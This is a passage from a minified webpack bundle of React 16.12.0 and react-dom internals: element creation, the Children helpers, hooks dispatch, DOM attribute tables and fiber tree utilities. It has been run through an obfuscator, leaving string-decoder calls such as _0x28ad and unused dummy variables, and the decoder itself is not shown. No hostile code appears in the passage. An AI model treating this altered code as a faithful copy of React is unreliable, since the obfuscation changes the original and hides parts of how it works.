  z.constructor = y, i(z, w.prototype), z.isPureReactComponent = true;
  var B = {};
  B.current = null;
  var L = {};
  L.current = null;
  var M = {};
  M.key = true, M.ref = true, M.__self = true, M.__source = true;
  var F = B, A = L, k = Object.prototype.hasOwnProperty, E = M;
  function j(e, n, a) {
    var i, u = f, o = {}, c = null, t = null;
    if (null != n) for (i in void 0 !== n.ref && (t = n.ref), void 0 !== n.key && (c = "" + n.key), n) k.call(n, i) && !E.hasOwnProperty(i) && (o[i] = n[i]);
    var x = arguments.length - 2;
    if (1 === x) o.children = a; else if (1 < x) {
      for (var s = Array(x), l = 0; l < x; l++) s[l] = arguments[l + 2];
      o.children = s;
    }
    if (e && e.defaultProps) for (i in x = e.defaultProps) void 0 === o[i] && (o[i] = x[i]);
    var d = {};
    return d.$$typeof = r, d.type = e, d.key = c, d.ref = t, d.props = o, d._owner = A.current, d;
  }
  function S(e) {
    var n = f;
    return "object" == typeof e && null !== e && e.$$typeof === r;
  }
  var T = /\/+/g, P = [];
  function H(e, n, a, i) {
    var u = f;
    if (P.length) {
      var r = P.pop();
      return r.result = e, r.keyPrefix = n, r.func = a, r.context = i, r.count = 0, r;
    }
    var o = {};
    return o.result = e, o.keyPrefix = n, o.func = a, o.context = i, o.count = 0, o;
  }
  function N(e) {
    var n = f;
    e.result = null, e.keyPrefix = null, e.func = null, e.context = null, e.count = 0, 10 > P.length && P.push(e);
  }
  function q(e, n, a) {
    return null == e ? 0 : function e(n, a, f, i) {
      var u = _0x28ad, c = typeof n;
      "undefined" !== c && "boolean" !== c || (n = null);
      var t = false;
      if (null === n) t = true; else switch (c) {
        case "string":
        case "number":
          t = true;
          break;
        case "object":
          switch (n.$$typeof) {
            case r:
            case o:
              t = true;
          }
      }
      if (t) return f(i, n, "" === a ? "." + K(n, 0) : a), 1;
      if (t = 0, a = "" === a ? "." : a + ":", Array.isArray(n)) for (var x = 0; x < n.length; x++) {
        var s = a + K(c = n[x], x);
        t += e(c, s, f, i);
      } else if (s = null === n || "object" != typeof n ? null : "function" == typeof (s = m && n[m] || n["@@iterator"]) ? s : null, "function" == typeof s) for (n = s.call(n), x = 0; !(c = n.next()).done;) t += e(c = c.value, s = a + K(c, x++), f, i); else if ("object" === c) throw f = "" + n, Error(v(31, "[object Object]" === f ? "object with keys {" + Object.keys(n).join(", ") + "}" : f, ""));
      return t;
    }(e, "", n, a);
  }
  function K(e, n) {
    var a, i, u = f;
    return "object" == typeof e && null !== e && null != e.key ? (a = e.key, i = {"=": "=0", ":": "=2"}, "$" + ("" + a).replace(/[=:]/g, function (e) {
      return i[e];
    })) : n.toString(36);
  }
  function U(e, n) {
    var a = f;
    e.func.call(e.context, n, e.count++);
  }
  function Z(e, n, a) {
    var i, u, o, c, t = f, x = e.result, s = e.keyPrefix;
    e = e.func.call(e.context, n, e.count++), Array.isArray(e) ? G(e, x, a, function (e) {
      return e;
    }) : null != e && (S(e) && (i = e, u = s + (!e.key || n && n.key === e.key ? "" : ("" + e.key).replace(T, "$&/") + "/") + a, (c = {})[(o = t)("0x680")] = r, c.type = i.type, c.key = u, c.ref = i.ref, c.props = i.props, c._owner = i._owner, e = c), x.push(e));
  }
  function G(e, n, a, i, u) {
    var r = f, o = "";
    null != a && (o = ("" + a).replace(T, "$&/") + "/"), q(e, Z, n = H(n, o, i, u)), N(n);
  }
  function Y() {
    var e = F.current;
    if (null === e) throw Error(v(321));
    return e;
  }
  var V = {};
  V.map = function (e, n, a) {
    if (null == e) return e;
    var f = [];
    return G(e, f, null, n, a), f;
  }, V.forEach = function (e, n, a) {
    if (null == e) return e;
    q(e, U, n = H(null, null, n, a)), N(n);
  }, V.count = function (e) {
    return q(e, function () {
      return null;
    }, null);
  }, V.toArray = function (e) {
    var n = [];
    return G(e, n, null, function (e) {
      return e;
    }), n;
  }, V.only = function (e) {
    if (!S(e)) throw Error(v(143));
    return e;
  };
  var I = {};
  I.suspense = null;
  var W = {};
  W.current = false;
  var J = {};
  J.Children = V, J.createRef = function () {
    var e = {};
    return e.current = null, e;
  }, J.Component = w, J.PureComponent = y, J.createContext = function (e, n) {
    var a = f;
    return void 0 === n && (n = null), (e = {$$typeof: l, _calculateChangedBits: n, _currentValue: e, _currentValue2: e, _threadCount: 0, Provider: null, Consumer: null}).Provider = {$$typeof: s, _context: e}, e.Consumer = e;
  }, J.forwardRef = function (e) {
    var n = f, a = {};
    return a.$$typeof = d, a.render = e, a;
  }, J.lazy = function (e) {
    var n = f, a = {};
    return a.$$typeof = C, a._ctor = e, a._status = -1, a._result = null, a;
  }, J.memo = function (e, n) {
    var a = f, i = {};
    return i.$$typeof = b, i.type = e, i.compare = void 0 === n ? null : n, i;
  }, J.useCallback = function (e, n) {
    var a = f;
    return Y().useCallback(e, n);
  }, J.useContext = function (e, n) {
    var a = f;
    return Y().useContext(e, n);
  }, J.useEffect = function (e, n) {
    var a = f;
    return Y().useEffect(e, n);
  }, J.useImperativeHandle = function (e, n, a) {
    var i = f;
    return Y().useImperativeHandle(e, n, a);
  }, J.useDebugValue = function () {}, J.useLayoutEffect = function (e, n) {
    var a = f;
    return Y().useLayoutEffect(e, n);
  }, J.useMemo = function (e, n) {
    var a = f;
    return Y().useMemo(e, n);
  }, J.useReducer = function (e, n, a) {
    var i = f;
    return Y().useReducer(e, n, a);
  }, J.useRef = function (e) {
    var n = f;
    return Y().useRef(e);
  }, J.useState = function (e) {
    var n = f;
    return Y().useState(e);
  }, J.Fragment = c, J.Profiler = x, J.StrictMode = t, J.Suspense = D, J.createElement = j, J.cloneElement = function (e, n, a) {
    var u = f;
    if (null == e) throw Error(v(267, e));
    var o = i({}, e.props), c = e.key, t = e.ref, x = e._owner;
    if (null != n) {
      if (void 0 !== n.ref && (t = n.ref, x = A.current), void 0 !== n.key && (c = "" + n.key), e.type && e.type.defaultProps) var s = e.type.defaultProps;
      for (l in n) k.call(n, l) && !E.hasOwnProperty(l) && (o[l] = void 0 === n[l] && void 0 !== s ? s[l] : n[l]);
    }
    var l = arguments.length - 2;
    if (1 === l) o.children = a; else if (1 < l) {
      s = Array(l);
      for (var d = 0; d < l; d++) s[d] = arguments[d + 2];
      o.children = s;
    }
    var D = {};
    return D.$$typeof = r, D.type = e.type, D.key = c, D.ref = t, D.props = o, D._owner = x, D;
  }, J.createFactory = function (e) {
    var n = f, a = j.bind(null, e);
    return a.type = e, a;
  }, J.isValidElement = S, J.version = "16.12.0", J.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = {}, J.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentDispatcher = F, J.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentBatchConfig = I, J.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner = A, J.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.IsSomeRendererActing = W, J.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.assign = i;
  var R = {default: J}, O = R && J || R;
  e.exports = O.default || O;
}, function (e, n, a) {
  var f = _0x25991a, i = Object.getOwnPropertySymbols, u = Object.prototype.hasOwnProperty, r = Object.prototype.propertyIsEnumerable;
  function o(e) {
    if (null == e) throw new TypeError("Object.assign cannot be called with null or undefined");
    return Object(e);
  }
  e.exports = function () {
    var e = f;
    try {
      if (!Object.assign) return false;
      var n = new String("abc");
      if (n[5] = "de", "5" === Object.getOwnPropertyNames(n)[0]) return false;
      for (var a = {}, i = 0; i < 10; i++) a["_" + String.fromCharCode(i)] = i;
      if ("0123456789" !== Object.getOwnPropertyNames(a).map(function (e) {
        return a[e];
      }).join("")) return false;
      var u = {};
      return "abcdefghijklmnopqrst".split("").forEach(function (e) {
        u[e] = e;
      }), "abcdefghijklmnopqrst" === Object.keys(Object.assign({}, u)).join("");
    } catch (e) {
      return false;
    }
  }() ? Object.assign : function (e, n) {
    for (var a, c, t = f, x = o(e), s = 1; s < arguments.length; s++) {
      for (var l in a = Object(arguments[s])) u.call(a, l) && (x[l] = a[l]);
      if (i) {
        c = i(a);
        for (var d = 0; d < c.length; d++) r.call(a, c[d]) && (x[c[d]] = a[c[d]]);
      }
    }
    return x;
  };
}, function (e, n, a) {
  var f = _0x25991a, i = a(0), u = a(10), r = a(11);
  function o(e) {
    for (var n = _0x28ad, a = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, f = 1; f < arguments.length; f++) a += "&args[]=" + encodeURIComponent(arguments[f]);
    return "Minified React error #" + e + "; visit " + a + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
  }
  if (!i) throw Error(o(227));
  var c = null, t = {};
  function x() {
    var e = _0x28ad;
    if (c) for (var n in t) {
      var a = t[n], f = c.indexOf(n);
      if (!(-1 < f)) throw Error(o(96, n));
      if (!l[f]) {
        if (!a.extractEvents) throw Error(o(97, n));
        for (var i in l[f] = a, f = a.eventTypes) {
          var u = void 0, r = f[i], x = a, D = i;
          if (d.hasOwnProperty(D)) throw Error(o(99, D));
          d[D] = r;
          var b = r.phasedRegistrationNames;
          if (b) {
            for (u in b) b.hasOwnProperty(u) && s(b[u], x, D);
            u = true;
          } else r.registrationName ? (s(r.registrationName, x, D), u = true) : u = false;
          if (!u) throw Error(o(98, i, n));
        }
      }
    }
  }
  function s(e, n, a) {
    var f = _0x28ad;
    if (D[e]) throw Error(o(100, e));
    D[e] = n, b[e] = n.eventTypes[a].dependencies;
  }
  var l = [], d = {}, D = {}, b = {};
  function C(e, n, a, f, i, u, r, o, c) {
    var t = _0x28ad, x = Array.prototype.slice.call(arguments, 3);
    try {
      n.apply(a, x);
    } catch (e) {
      this.onError(e);
    }
  }
  var m = false, v = null, g = false, _ = null, h = {onError: function (e) {
    m = true, v = e;
  }};
  function w(e, n, a, f, i, u, r, o, c) {
    var t = _0x28ad;
    m = false, v = null, C.apply(h, arguments);
  }
  var p = null, y = null, z = null;
  function B(e, n, a) {
    var f = _0x28ad, i = e.type || "unknown-event";
    e.currentTarget = z(a), function (e, n, a, i, u, r, c, t, x) {
      var s = f;
      if (w.apply(this, arguments), m) {
        if (!m) throw Error(o(198));
        var l = v;
        m = false, v = null, g || (g = true, _ = l);
      }
    }(i, n, void 0, e), e.currentTarget = null;
  }
  function L(e, n) {
    var a = _0x28ad;
    if (null == n) throw Error(o(30));
    return null == e ? n : Array.isArray(e) ? Array.isArray(n) ? (e.push.apply(e, n), e) : (e.push(n), e) : Array.isArray(n) ? [e].concat(n) : [e, n];
  }
  function M(e, n, a) {
    var f = _0x28ad;
    Array.isArray(e) ? e.forEach(n, a) : e && n.call(a, e);
  }
  var F = null;
  function A(e) {
    var n = _0x28ad;
    if (e) {
      var a = e._dispatchListeners, f = e._dispatchInstances;
      if (Array.isArray(a)) for (var i = 0; i < a.length && !e.isPropagationStopped(); i++) B(e, a[i], f[i]); else a && B(e, a, f);
      e._dispatchListeners = null, e._dispatchInstances = null, e.isPersistent() || e.constructor.release(e);
    }
  }
  function k(e) {
    if (null !== e && (F = L(F, e)), e = F, F = null, e) {
      if (M(e, A), F) throw Error(o(95));
      if (g) throw e = _, g = false, _ = null, e;
    }
  }
  var E = {};
  E.injectEventPluginOrder = function (e) {
    var n = f;
    if (c) throw Error(o(101));
    c = Array.prototype.slice.call(e), x();
  }, E.injectEventPluginsByName = function (e) {
    var n, a = f, i = false;
    for (n in e) if (e.hasOwnProperty(n)) {
      var u = e[n];
      if (!t.hasOwnProperty(n) || t[n] !== u) {
        if (t[n]) throw Error(o(102, n));
        t[n] = u, i = true;
      }
    }
    i && x();
  };
  var j = E;
  function S(e, n) {
    var a = f, i = e.stateNode;
    if (!i) return null;
    var u = p(i);
    if (!u) return null;
    i = u[n];
    e: switch (n) {
      case "onClick":
      case "onClickCapture":
      case "onDoubleClick":
      case "onDoubleClickCapture":
      case "onMouseDown":
      case "onMouseDownCapture":
      case "onMouseMove":
      case "onMouseMoveCapture":
      case "onMouseUp":
      case "onMouseUpCapture":
        (u = !u.disabled) || (u = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), e = !u;
        break e;
      default:
        e = false;
    }
    if (e) return null;
    if (i && "function" != typeof i) throw Error(o(231, n, typeof i));
    return i;
  }
  var T = i.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED, P = {};
  P.current = null;
  var H = {};
  H.suspense = null, T.hasOwnProperty("ReactCurrentDispatcher") || (T.ReactCurrentDispatcher = P), T.hasOwnProperty("ReactCurrentBatchConfig") || (T.ReactCurrentBatchConfig = H);
  var N = /^(.*)[\\\/]/, q = "function" == typeof Symbol && Symbol.for, K = q ? Symbol.for("react.element") : 60103, U = q ? Symbol.for("react.portal") : 60106, Z = q ? Symbol.for("react.fragment") : 60107, G = q ? Symbol.for("react.strict_mode") : 60108, Y = q ? Symbol.for("react.profiler") : 60114, V = q ? Symbol.for("react.provider") : 60109, I = q ? Symbol.for("react.context") : 60110, W = q ? Symbol.for("react.concurrent_mode") : 60111, J = q ? Symbol.for("react.forward_ref") : 60112, R = q ? Symbol.for("react.suspense") : 60113, O = q ? Symbol.for("react.suspense_list") : 60120, X = q ? Symbol.for("react.memo") : 60115, $ = q ? Symbol.for("react.lazy") : 60116;
  q && Symbol.for("react.fundamental"), q && Symbol.for("react.responder"), q && Symbol.for("react.scope");
  var Q = "function" == typeof Symbol && Symbol.iterator;
  function ee(e) {
    var n = f;
    return null === e || "object" != typeof e ? null : "function" == typeof (e = Q && e[Q] || e["@@iterator"]) ? e : null;
  }
  function ne(e) {
    var n = f;
    if (null == e) return null;
    if ("function" == typeof e) return e.displayName || e.name || null;
    if ("string" == typeof e) return e;
    switch (e) {
      case Z:
        return "Fragment";
      case U:
        return "Portal";
      case Y:
        return "Profiler";
      case G:
        return "StrictMode";
      case R:
        return "Suspense";
      case O:
        return "SuspenseList";
    }
    if ("object" == typeof e) switch (e.$$typeof) {
      case I:
        return "Context.Consumer";
      case V:
        return "Context.Provider";
      case J:
        var a = e.render;
        return a = a.displayName || a.name || "", e.displayName || ("" !== a ? "ForwardRef(" + a + ")" : "ForwardRef");
      case X:
        return ne(e.type);
      case $:
        if (e = 1 === e._status ? e._result : null) return ne(e);
    }
    return null;
  }
  function ae(e) {
    var n = f, a = "";
    do {
      e: switch (e.tag) {
        case 3:
        case 4:
        case 6:
        case 7:
        case 10:
        case 9:
          var i = "";
          break e;
        default:
          var u = e._debugOwner, r = e._debugSource, o = ne(e.type);
          i = null, u && (i = ne(u.type)), u = o, o = "", r ? o = " (at " + r.fileName.replace(N, "") + ":" + r.lineNumber + ")" : i && (o = " (created by " + i + ")"), i = "\n    in " + (u || "Unknown") + o;
      }
      a += i, e = e.return;
    } while (e);
    return a;
  }
  var fe = !("undefined" == typeof window || void 0 === window.document || void 0 === window.document.createElement), ie = null, ue = null, re = null;
  function oe(e) {
    var n = f;
    if (e = y(e)) {
      if ("function" != typeof ie) throw Error(o(280));
      var a = p(e.stateNode);
      ie(e.stateNode, e.type, a);
    }
  }
  function ce(e) {
    ue ? re ? re.push(e) : re = [e] : ue = e;
  }
  function te() {
    var e = f;
    if (ue) {
      var n = ue, a = re;
      if (re = ue = null, oe(n), a) for (n = 0; n < a.length; n++) oe(a[n]);
    }
  }
  function xe(e, n) {
    return e(n);
  }
  function se(e, n, a, f) {
    return e(n, a, f);
  }
  function le() {}
  var de = xe, De = false, be = false;
  function Ce() {
    null === ue && null === re || (le(), te());
  }
  new Map;
  var me = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/, ve = Object.prototype.hasOwnProperty, ge = {}, _e = {};
  function he(e, n, a, i, u, r) {
    var o = f;
    this.acceptsBooleans = 2 === n || 3 === n || 4 === n, this.attributeName = i, this.attributeNamespace = u, this.mustUseProperty = a, this.propertyName = e, this.type = n, this.sanitizeURL = r;
  }
  var we = {};
  "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function (e) {
    we[e] = new he(e, 0, false, e, null, false);
  }), [["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function (e) {
    var n = e[0];
    we[n] = new he(n, 1, false, e[1], null, false);
  }), ["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
    var n = f;
    we[e] = new he(e, 2, false, e.toLowerCase(), null, false);
  }), ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (e) {
    we[e] = new he(e, 2, false, e, null, false);
  }), "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function (e) {
    var n = f;
    we[e] = new he(e, 3, false, e.toLowerCase(), null, false);
  }), ["checked", "multiple", "muted", "selected"].forEach(function (e) {
    we[e] = new he(e, 3, true, e, null, false);
  }), ["capture", "download"].forEach(function (e) {
    we[e] = new he(e, 4, false, e, null, false);
  }), ["cols", "rows", "size", "span"].forEach(function (e) {
    we[e] = new he(e, 6, false, e, null, false);
  }), ["rowSpan", "start"].forEach(function (e) {
    var n = f;
    we[e] = new he(e, 5, false, e.toLowerCase(), null, false);
  });
  var pe = /[\-:]([a-z])/g;
  function ye(e) {
    var n = f;
    return e[1].toUpperCase();
  }
  function ze(e) {
    var n = f;
    switch (typeof e) {
      case "boolean":
      case "number":
      case "object":
      case "string":
      case "undefined":
        return e;
      default:
        return "";
    }
  }
  function Be(e, n, a, i) {
    var u, r, o = f, c = we.hasOwnProperty(n) ? we[n] : null;
    (null !== c ? 0 === c.type : !i && 2 < n.length && ("o" === n[0] || "O" === n[0]) && ("n" === n[1] || "N" === n[1])) || (function (e, n, a, f) {
      var i = o;
      if (null == n || function (e, n, a, f) {
        var i = _0x28ad;
        if (null !== a && 0 === a.type) return false;
        switch (typeof n) {
          case "function":
          case "symbol":
            return true;
          case "boolean":
            return !f && (null !== a ? !a.acceptsBooleans : "data-" !== (e = e.toLowerCase().slice(0, 5)) && "aria-" !== e);
          default:
            return false;
        }
      }(e, n, a, f)) return true;
      if (f) return false;
      if (null !== a) switch (a.type) {
        case 3:
          return !n;
        case 4:
          return false === n;
        case 5:
          return isNaN(n);
        case 6:
          return isNaN(n) || 1 > n;
      }
      return false;
    }(n, a, c, i) && (a = null), i || null === c ? (u = n, (ve[(r = o)("0x7ed")](_e, u) || !ve.call(ge, u) && (me.test(u) ? _e[u] = true : (ge[u] = true, 0))) && (null === a ? e.removeAttribute(n) : e.setAttribute(n, "" + a))) : c.mustUseProperty ? e[c.propertyName] = null === a ? 3 !== c.type && "" : a : (n = c.attributeName, i = c.attributeNamespace, null === a ? e.removeAttribute(n) : (a = 3 === (c = c.type) || 4 === c && true === a ? "" : "" + a, i ? e.setAttributeNS(i, n, a) : e.setAttribute(n, a))));
  }
  function Le(e) {
    var n = f, a = e.type;
    return (e = e.nodeName) && "input" === e.toLowerCase() && ("checkbox" === a || "radio" === a);
  }
  function Me(e) {
    var n = f;
    e._valueTracker || (e._valueTracker = function (e) {
      var a = n, f = Le(e) ? "checked" : "value", i = Object.getOwnPropertyDescriptor(e.constructor.prototype, f), u = "" + e[f];
      if (!e.hasOwnProperty(f) && void 0 !== i && "function" == typeof i.get && "function" == typeof i.set) {
        var r = i.get, o = i.set, c = {};
        return c.enumerable = i.enumerable, Object.defineProperty(e, f, {configurable: true, get: function () {
          return r.call(this);
        }, set: function (e) {
          u = "" + e, o.call(this, e);
        }}), Object.defineProperty(e, f, c), {getValue: function () {
          return u;
        }, setValue: function (e) {
          u = "" + e;
        }, stopTracking: function () {
          e._valueTracker = null, delete e[f];
        }};
      }
    }(e));
  }
  function Fe(e) {
    var n = f;
    if (!e) return false;
    var a = e._valueTracker;
    if (!a) return true;
    var i = a.getValue(), u = "";
    return e && (u = Le(e) ? e.checked ? "true" : "false" : e.value), (e = u) !== i && (a.setValue(e), true);
  }
  function Ae(e, n) {
    var a = f, i = n.checked, r = {};
    return r.defaultChecked = void 0, r.defaultValue = void 0, r.value = void 0, r.checked = null != i ? i : e._wrapperState.initialChecked, u({}, n, r);
  }
  function ke(e, n) {
    var a = f, i = null == n.defaultValue ? "" : n.defaultValue, u = null != n.checked ? n.checked : n.defaultChecked;
    i = ze(null != n.value ? n.value : i), e._wrapperState = {initialChecked: u, initialValue: i, controlled: "checkbox" === n.type || "radio" === n.type ? null != n.checked : null != n.value};
  }
  function Ee(e, n) {
    var a = f;
    null != (n = n.checked) && Be(e, "checked", n, false);
  }
  function je(e, n) {
    var a = f;
    Ee(e, n);
    var i = ze(n.value), u = n.type;
    if (null != i) "number" === u ? (0 === i && "" === e.value || e.value != i) && (e.value = "" + i) : e.value !== "" + i && (e.value = "" + i); else if ("submit" === u || "reset" === u) return void e.removeAttribute("value");
    n.hasOwnProperty("value") ? Te(e, n.type, i) : n.hasOwnProperty("defaultValue") && Te(e, n.type, ze(n.defaultValue)), null == n.checked && null != n.defaultChecked && (e.defaultChecked = !!n.defaultChecked);
  }
  function Se(e, n, a) {
    var i = f;
    if (n.hasOwnProperty("value") || n.hasOwnProperty("defaultValue")) {
      var u = n.type;
      if (!("submit" !== u && "reset" !== u || void 0 !== n.value && null !== n.value)) return;
      n = "" + e._wrapperState.initialValue, a || n === e.value || (e.value = n), e.defaultValue = n;
    }
    "" !== (a = e.name) && (e.name = ""), e.defaultChecked = !e.defaultChecked, e.defaultChecked = !!e._wrapperState.initialChecked, "" !== a && (e.name = a);
  }
  function Te(e, n, a) {
    var i = f;
    "number" === n && e.ownerDocument.activeElement === e || (null == a ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + a && (e.defaultValue = "" + a));
  }
  function Pe(e, n) {
    var a, r, o, c = f, t = {};
    return t.children = void 0, e = u(t, n), a = n.children, o = "", i[(r = c)("0x683")].forEach(a, function (e) {
      null != e && (o += e);
    }), (n = o) && (e.children = n), e;
  }
  function He(e, n, a, i) {
    var u = f;
    if (e = e.options, n) {
      n = {};
      for (var r = 0; r < a.length; r++) n["$" + a[r]] = true;
      for (a = 0; a < e.length; a++) r = n.hasOwnProperty("$" + e[a].value), e[a].selected !== r && (e[a].selected = r), r && i && (e[a].defaultSelected = true);
    } else {
      for (a = "" + ze(a), n = null, r = 0; r < e.length; r++) {
        if (e[r].value === a) return e[r].selected = true, void (i && (e[r].defaultSelected = true));
        null !== n || e[r].disabled || (n = e[r]);
      }
      null !== n && (n.selected = true);
    }
  }
  function Ne(e, n) {
    var a = f;
    if (null != n.dangerouslySetInnerHTML) throw Error(o(91));
    var i = {};
    return i.value = void 0, i.defaultValue = void 0, i.children = "" + e._wrapperState.initialValue, u({}, n, i);
  }
  function qe(e, n) {
    var a = f, i = n.value;
    if (null == i) {
      if (i = n.defaultValue, null != (n = n.children)) {
        if (null != i) throw Error(o(92));
        if (Array.isArray(n)) {
          if (!(1 >= n.length)) throw Error(o(93));
          n = n[0];
        }
        i = n;
      }
      null == i && (i = "");
    }
    var u = {};
    u.initialValue = ze(i), e._wrapperState = u;
  }
  function Ke(e, n) {
    var a = f, i = ze(n.value), u = ze(n.defaultValue);
    null != i && ((i = "" + i) !== e.value && (e.value = i), null == n.defaultValue && e.defaultValue !== i && (e.defaultValue = i)), null != u && (e.defaultValue = "" + u);
  }
  function Ue(e) {
    var n = f, a = e.textContent;
    a === e._wrapperState.initialValue && "" !== a && null !== a && (e.value = a);
  }
  "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function (e) {
    var n = e.replace(pe, ye);
    we[n] = new he(n, 1, false, e, null, false);
  }), "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (e) {
    var n = f, a = e.replace(pe, ye);
    we[a] = new he(a, 1, false, e, "http://www.w3.org/1999/xlink", false);
  }), ["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
    var n = f, a = e.replace(pe, ye);
    we[a] = new he(a, 1, false, e, "http://www.w3.org/XML/1998/namespace", false);
  }), ["tabIndex", "crossOrigin"].forEach(function (e) {
    var n = f;
    we[e] = new he(e, 1, false, e.toLowerCase(), null, false);
  }), we.xlinkHref = new he("xlinkHref", 1, false, "xlink:href", "http://www.w3.org/1999/xlink", true), ["src", "href", "action", "formAction"].forEach(function (e) {
    var n = f;
    we[e] = new he(e, 1, false, e.toLowerCase(), null, true);
  });
  var Ze = "http://www.w3.org/1999/xhtml", Ge = "http://www.w3.org/2000/svg";
  function Ye(e) {
    var n = f;
    switch (e) {
      case "svg":
        return "http://www.w3.org/2000/svg";
      case "math":
        return "http://www.w3.org/1998/Math/MathML";
      default:
        return "http://www.w3.org/1999/xhtml";
    }
  }
  function Ve(e, n) {
    var a = f;
    return null == e || "http://www.w3.org/1999/xhtml" === e ? Ye(n) : "http://www.w3.org/2000/svg" === e && "foreignObject" === n ? "http://www.w3.org/1999/xhtml" : e;
  }
  var Ie, We, Je, Re = (We = function (e, n) {
    var a = f;
    if (e.namespaceURI !== Ge || "innerHTML" in e) e.innerHTML = n; else {
      for ((Ie = Ie || document.createElement("div")).innerHTML = "<svg>" + n.valueOf().toString() + "</svg>", n = Ie.firstChild; e.firstChild;) e.removeChild(e.firstChild);
      for (; n.firstChild;) e.appendChild(n.firstChild);
    }
  }, (Je = f)("0xb2b") != typeof MSApp && MSApp.execUnsafeLocalFunction ? function (e, n, a, f) {
    MSApp.execUnsafeLocalFunction(function () {
      return We(e, n);
    });
  } : We);
  function Oe(e, n) {
    var a = f;
    if (n) {
      var i = e.firstChild;
      if (i && i === e.lastChild && 3 === i.nodeType) return void (i.nodeValue = n);
    }
    e.textContent = n;
  }
  function Xe(e, n) {
    var a = f, i = {};
    return i[e.toLowerCase()] = n.toLowerCase(), i["Webkit" + e] = "webkit" + n, i["Moz" + e] = "moz" + n, i;
  }
  var $e = {};
  $e.animationend = Xe("Animation", "AnimationEnd"), $e.animationiteration = Xe("Animation", "AnimationIteration"), $e.animationstart = Xe("Animation", "AnimationStart"), $e.transitionend = Xe("Transition", "TransitionEnd");
  var Qe = $e, en = {}, nn = {};
  function an(e) {
    var n = f;
    if (en[e]) return en[e];
    if (!Qe[e]) return e;
    var a, i = Qe[e];
    for (a in i) if (i.hasOwnProperty(a) && a in nn) return en[e] = i[a];
    return e;
  }
  fe && (nn = document.createElement("div").style, "AnimationEvent" in window || (delete Qe.animationend.animation, delete Qe.animationiteration.animation, delete Qe.animationstart.animation), "TransitionEvent" in window || delete Qe.transitionend.transition);
  var fn = an("animationend"), un = an("animationiteration"), rn = an("animationstart"), on = an("transitionend"), cn = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange seeked seeking stalled suspend timeupdate volumechange waiting".split(" ");
  function tn(e) {
    var n = f, a = e, i = e;
    if (e.alternate) for (; a.return;) a = a.return; else {
      e = a;
      do {
        0 != (1026 & (a = e).effectTag) && (i = a.return), e = a.return;
      } while (e);
    }
    return 3 === a.tag ? i : null;
  }
  function xn(e) {
    var n = f;
    if (13 === e.tag) {
      var a = e.memoizedState;
      if (null === a && null !== (e = e.alternate) && (a = e.memoizedState), null !== a) return a.dehydrated;
    }
    return null;
  }
  function sn(e) {
    if (tn(e) !== e) throw Error(o(188));
  }
  function ln(e) {
    var n = f;
    if (!(e = function (e) {
      var n = _0x28ad, a = e.alternate;
      if (!a) {
        if (null === (a = tn(e))) throw Error(o(188));
        return a !== e ? null : e;
      }
      for (var f = e, i = a;;) {
        var u = f.return;
        if (null === u) break;
        var r = u.alternate;
        if (null === r) {
          if (null !== (i = u.return)) {
            f = i;
            continue;
          }
          break;
        }
        if (u.child === r.child) {
          for (r = u.child; r;) {
            if (r === f) return sn(u), e;
            if (r === i) return sn(u), a;
            r = r.sibling;
          }
          throw Error(o(188));
        }
        if (f.return !== i.return) f = u, i = r; else {
          for (var c = false, t = u.child; t;) {
            if (t === f) {
              c = true, f = u, i = r;
              break;
            }
            if (t === i) {
              c = true, i = u, f = r;
              break;
            }
            t = t.sibling;
          }
          if (!c) {
            for (t = r.child; t;) {
              if (t === f) {
                c = true, f = r, i = u;
                break;
              }
              if (t === i) {
                c = true, i = r, f = u;
                break;
              }
              t = t.sibling;
            }
            if (!c) throw Error(o(189));
          }
        }
        if (f.alternate !== i) throw Error(o(190));
      }
